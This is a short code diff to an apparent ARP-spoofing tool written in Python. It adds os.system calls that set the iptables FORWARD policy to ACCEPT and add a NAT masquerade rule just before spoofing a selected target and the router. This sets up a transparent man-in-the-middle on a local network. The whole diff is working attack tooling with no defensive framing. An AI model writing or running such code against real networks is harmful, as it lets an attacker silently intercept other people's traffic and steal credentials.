@@ -2,6 +2,7 @@ from rich.console import Console
 from rich.text import Text
 from .network_utils import scan_network, select_target, toggle_forwarding, get_router
 from .spoofer_logic import spoof
+import os
 
 
 console = Console()
@@ -47,6 +48,8 @@ def main():
     
     print("[+] Enabling IP forwarding...")
     toggle_forwarding(True)
+    os.system("iptables -P FORWARD ACCEPT")
+    os.system(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE")
 
     print("[+] Starting ARP spoofing...")
     spoof(target_ip, target_mac, router_ip, router_mac)
